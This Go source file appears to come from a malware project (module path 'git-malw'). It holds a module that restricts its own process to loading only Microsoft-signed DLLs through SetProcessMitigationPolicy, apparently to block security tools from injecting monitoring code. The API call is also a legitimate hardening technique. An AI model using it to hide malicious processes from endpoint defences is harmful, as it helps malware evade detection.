package antidll

import (
	"git-malw/internal/utils"
	"unsafe"
)

type DLLProtector struct {
	winapi *utils.WinAPI
}

type PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY struct {
	MicrosoftSignedOnly uint32
}

const (
	ProcessSignaturePolicyMitigation = 8
)

func New() *DLLProtector {
	return &DLLProtector{
		winapi: utils.NewWinAPI(),
	}
}

func (d *DLLProtector) PreventDLLInjection() error {
	var onlyMicrosoftBinaries PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY
	onlyMicrosoftBinaries.MicrosoftSignedOnly = 1

	kernelbase := d.winapi.GetModuleHandle("kernelbase.dll")
	if kernelbase == 0 {
		return d.winapi.LastError()
	}

	procSetProcessMitigationPolicy := d.winapi.GetProcAddress(kernelbase, "SetProcessMitigationPolicy")
	if procSetProcessMitigationPolicy == 0 {
		return d.winapi.LastError()
	}

	ret, _, err := d.winapi.CallProc(
		procSetProcessMitigationPolicy,
		uintptr(ProcessSignaturePolicyMitigation),
		uintptr(unsafe.Pointer(&onlyMicrosoftBinaries)),
		uintptr(unsafe.Sizeof(onlyMicrosoftBinaries)),
	)

	if ret == 0 {
		return err
	}

	return nil
}
